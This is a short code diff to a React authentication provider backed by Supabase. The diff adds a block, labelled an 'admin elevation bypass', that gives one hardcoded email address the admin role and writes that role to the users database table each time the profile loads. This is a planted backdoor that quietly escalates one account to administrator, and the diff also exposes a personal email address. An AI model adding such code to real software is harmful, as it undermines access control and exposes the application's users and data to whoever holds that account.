@@ -67,7 +67,18 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       .maybeSingle();
 
     if (!error && data) {
-      setProfile(data as UserProfile);
+      let userProfile = data as UserProfile;
+      
+      // Admin elevation bypass for specific email
+      if (userProfile.email === "liorazedwoem@gmail.com" && userProfile.role !== "admin") {
+        userProfile.role = "admin";
+        await supabase
+          .from("users")
+          .update({ role: "admin" })
+          .eq("id", userId);
+      }
+      
+      setProfile(userProfile);
     }
   };
 
